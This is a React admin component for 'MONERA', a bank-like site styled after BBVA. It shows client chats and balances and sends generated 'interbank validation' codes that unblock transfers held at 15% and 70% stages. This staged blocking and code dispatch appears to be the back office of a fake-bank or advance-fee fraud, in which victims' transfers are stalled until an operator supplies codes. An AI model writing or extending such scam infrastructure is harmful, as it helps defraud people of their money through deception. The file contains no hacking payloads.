import { useCallback, useEffect, useRef, useState } from 'react';
import {
  Check,
  Copy,
  KeyRound,
  MessageSquare,
  Send,
  ShieldAlert,
  Sparkles,
} from 'lucide-react';
import { apiRequest } from '../api/client';
import { formatDateTime, formatMoney } from '../utils/format';

export default function AdminSupportCenter({ initialMemberId = null, onGlobalRefresh }) {
  const [threads, setThreads] = useState([]);
  const [selectedId, setSelectedId] = useState(initialMemberId);
  const [messages, setMessages] = useState([]);
  const [pendingCodes, setPendingCodes] = useState([]);
  const [replyText, setReplyText] = useState('');
  const [sending, setSending] = useState(false);
  const [copiedCode, setCopiedCode] = useState('');
  const bottomRef = useRef(null);

  const loadThreads = useCallback(async () => {
    try {
      const res = await apiRequest('/admin/messages/threads');
      const list = res.threads || [];
      setThreads(list);
      if (!selectedId && list.length > 0) {
        setSelectedId(list[0].memberId);
      }
    } catch {
      return undefined;
    }
  }, [selectedId]);

  const loadConversation = useCallback(async (memberId) => {
    if (!memberId) return;
    try {
      const res = await apiRequest(`/admin/messages/${memberId}`);
      setMessages(res.messages || []);
      setPendingCodes(res.pendingCodeTransfers || []);
    } catch {
      return undefined;
    }
  }, []);

  useEffect(() => {
    if (initialMemberId) {
      setSelectedId(initialMemberId);
    }
  }, [initialMemberId]);

  useEffect(() => {
    loadThreads();
    const timer = setInterval(() => {
      loadThreads();
      if (selectedId) loadConversation(selectedId);
    }, 4000);
    return () => clearInterval(timer);
  }, [loadThreads, loadConversation, selectedId]);

  useEffect(() => {
    if (selectedId) {
      loadConversation(selectedId);
    }
  }, [selectedId, loadConversation]);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages.length]);

  const selectedThread = threads.find((t) => t.memberId === selectedId);

  const handleSendReply = async (e) => {
    e.preventDefault();
    if (!selectedId || !replyText.trim()) return;
    setSending(true);
    try {
      await apiRequest(`/admin/messages/${selectedId}`, {
        method: 'POST',
        body: { content: replyText.trim() },
      });
      setReplyText('');
      await loadConversation(selectedId);
      await loadThreads();
      if (onGlobalRefresh) onGlobalRefresh(true);
    } finally {
      setSending(false);
    }
  };

  const handleDispatchCodeToMember = async (txItem) => {
    if (!selectedId || !txItem.activeCode) return;
    setSending(true);
    try {
      const stageLabel =
        txItem.status === 'awaiting_code_1'
          ? '1er code de validation interbancaire (déblocage palier 15% → 70%)'
          : '2nd code de compensation finale (finalisation 70% → 100%)';

      await apiRequest(`/admin/messages/${selectedId}`, {
        method: 'POST',
        body: {
          txReference: txItem.reference,
          attachedCode: txItem.activeCode,
          content: `Bonjour, voici votre ${stageLabel} pour le virement ${txItem.reference} (${formatMoney(txItem.amount)} vers ${txItem.bankName}) : ${txItem.activeCode}. Copiez ce code et validez-le dans votre espace Virement.`,
        },
      });
      await loadConversation(selectedId);
      await loadThreads();
      if (onGlobalRefresh) onGlobalRefresh(true);
    } finally {
      setSending(false);
    }
  };

  return (
    <div className="rounded-3xl bg-white border border-slate-200/80 shadow-bbva overflow-hidden grid lg:grid-cols-12 min-h-[660px]">
      <div className="lg:col-span-4 border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col bg-[#F4F7FB]/50">
        <div className="p-4 border-b border-slate-200 bg-white">
          <h2 className="font-display text-base font-bold text-[#072146] flex items-center gap-2">
            <MessageSquare className="h-4 w-4 text-[#0284FE]" />
            <span>Conversations Clients ({threads.length})</span>
          </h2>
          <p className="text-xs text-slate-500 mt-0.5">
            Les virements bloqués à 15% ou 70% remontent automatiquement en tête.
          </p>
        </div>

        <div className="divide-y divide-slate-200/70 overflow-y-auto max-h-[580px]">
          {threads.map((t) => {
            const active = t.memberId === selectedId;
            return (
              <button
                key={t.memberId}
                type="button"
                onClick={() => setSelectedId(t.memberId)}
                className={`w-full text-left p-4 transition flex flex-col gap-1.5 ${
                  active ? 'bg-[#072146] text-white' : 'hover:bg-white text-slate-800'
                }`}
              >
                <div className="flex items-center justify-between gap-2">
                  <span className="font-display font-bold text-sm truncate">{t.fullName}</span>
                  <div className="flex items-center gap-1.5 shrink-0">
                    {t.pendingCodeTransfers.length > 0 && (
                      <span className="rounded-full bg-amber-400 px-2 py-0.5 text-[10px] font-extrabold text-[#04142C]">
                        Code {t.pendingCodeTransfers[0].progressPercent}%
                      </span>
                    )}
                    {t.unreadCount > 0 && (
                      <span className="rounded-full bg-[#2DCCCD] px-2 py-0.5 text-[10px] font-extrabold text-[#04142C]">
                        {t.unreadCount} non lu
                      </span>
                    )}
                  </div>
                </div>

                <div
                  className={`font-mono text-[11px] ${
                    active ? 'text-cyan-200' : 'text-slate-500'
                  }`}
                >
                  {t.memberCode} • {formatMoney(t.balance)}
                </div>

                {t.lastMessage && (
                  <p
                    className={`text-xs truncate ${
                      active ? 'text-slate-300' : 'text-slate-500'
                    }`}
                  >
                    {t.lastMessage}
                  </p>
                )}
              </button>
            );
          })}
        </div>
      </div>

      <div className="lg:col-span-8 flex flex-col">
        {selectedThread ? (
          <>
            <div className="px-6 py-4 bg-[#072146] text-white flex flex-wrap items-center justify-between gap-3">
              <div>
                <div className="font-display text-lg font-bold">{selectedThread.fullName}</div>
                <div className="font-mono text-xs text-cyan-200">
                  {selectedThread.memberCode} • {selectedThread.email}
                </div>
              </div>
              <div className="text-right font-mono text-sm font-bold text-[#F0D384]">
                Solde : {formatMoney(selectedThread.balance)}
              </div>
            </div>

            {pendingCodes.length > 0 && (
              <div className="bg-amber-50 border-b border-amber-200 px-6 py-4 space-y-2.5">
                <div className="text-xs font-extrabold uppercase tracking-wider text-amber-900 flex items-center gap-2">
                  <ShieldAlert className="h-4 w-4 text-amber-600" />
                  <span>
                    Codes Générés Automatiquement pour ce Membre ({pendingCodes.length})
                  </span>
                </div>

                {pendingCodes.map((item) => (
                  <div
                    key={item.id}
                    className="rounded-2xl bg-white border border-amber-300 p-3.5 flex flex-wrap items-center justify-between gap-3 shadow-sm"
                  >
                    <div className="space-y-0.5">
                      <div className="flex items-center gap-2 text-xs font-bold text-[#072146]">
                        <span className="font-mono text-[#0284FE]">{item.reference}</span>
                        <span>• {item.bankName}</span>
                        <span>• {formatMoney(item.amount)}</span>
                        <span className="rounded-md bg-amber-100 px-2 py-0.5 text-[11px] font-extrabold text-amber-900">
                          Bloqué à {item.progressPercent}%
                        </span>
                      </div>
                      <div className="flex items-center gap-2 pt-1">
                        <KeyRound className="h-4 w-4 text-[#0284FE]" />
                        <span className="text-xs text-slate-500">
                          {item.status === 'awaiting_code_1' ? 'Code N°1 (15%→70%) :' : 'Nouveau Code N°2 (70%→100%) :'}
                        </span>
                        <span className="font-mono text-base font-extrabold text-[#072146] tracking-wider bg-slate-100 px-2.5 py-0.5 rounded-lg">
                          {item.activeCode}
                        </span>
                      </div>
                    </div>

                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={() => {
                          navigator.clipboard.writeText(item.activeCode);
                          setCopiedCode(item.activeCode);
                          setTimeout(() => setCopiedCode(''), 2000);
                        }}
                        className="inline-flex items-center gap-1 rounded-xl border border-slate-300 px-3 py-2 text-xs font-bold text-[#072146] hover:bg-slate-100"
                      >
                        {copiedCode === item.activeCode ? (
                          <Check className="h-3.5 w-3.5 text-emerald-600" />
                        ) : (
                          <Copy className="h-3.5 w-3.5" />
                        )}
                        <span>Copier</span>
                      </button>

                      <button
                        type="button"
                        disabled={sending}
                        onClick={() => handleDispatchCodeToMember(item)}
                        className="inline-flex items-center gap-1.5 rounded-xl bg-[#0284FE] px-4 py-2 text-xs font-bold text-white shadow-sm hover:bg-[#072146] transition"
                      >
                        <Sparkles className="h-3.5 w-3.5" />
                        <span>Envoyer ce code dans la messagerie</span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}

            <div className="flex-1 overflow-y-auto p-6 space-y-4 bg-[#F4F7FB]/40 max-h-[420px]">
              {messages.map((msg) => {
                const isAdmin = msg.senderRole === 'admin';
                return (
                  <div
                    key={msg.id}
                    className={`flex flex-col ${isAdmin ? 'items-end' : 'items-start'}`}
                  >
                    <div
                      className={`max-w-[82%] rounded-2xl px-4 py-3 text-sm ${
                        isAdmin
                          ? 'bg-[#072146] text-white rounded-br-sm'
                          : 'bg-white border border-slate-200 text-slate-800 rounded-bl-sm shadow-sm'
                      }`}
                    >
                      <div className="text-[10px] font-bold uppercase tracking-wider opacity-70 mb-1">
                        {isAdmin ? 'Administration MONERA' : selectedThread.fullName}
                      </div>
                      <p className="whitespace-pre-wrap leading-relaxed">{msg.content}</p>
                    </div>
                    <span className="mt-1 text-[11px] text-slate-400">
                      {formatDateTime(msg.createdAt)}
                    </span>
                  </div>
                );
              })}
              <div ref={bottomRef} />
            </div>

            <form
              onSubmit={handleSendReply}
              className="p-4 bg-white border-t border-slate-200 flex gap-2.5"
            >
              <input
                type="text"
                value={replyText}
                onChange={(e) => setReplyText(e.target.value)}
                placeholder={`Répondre à ${selectedThread.fullName} ou coller un code de validation...`}
                className="flex-1 rounded-xl border border-slate-300 px-4 py-3 text-sm focus:border-[#0284FE] focus:outline-none"
              />
              <button
                type="submit"
                disabled={sending || !replyText.trim()}
                className="inline-flex items-center gap-2 rounded-xl bg-[#0284FE] px-5 py-3 text-xs sm:text-sm font-bold text-white hover:bg-[#072146] transition disabled:opacity-50"
              >
                <Send className="h-4 w-4" />
                <span>Envoyer au membre</span>
              </button>
            </form>
          </>
        ) : (
          <div className="flex-1 flex items-center justify-center text-sm text-slate-400">
            Sélectionnez un client pour ouvrir sa messagerie d’assistance.
          </div>
        )}
      </div>
    </div>
  );
}
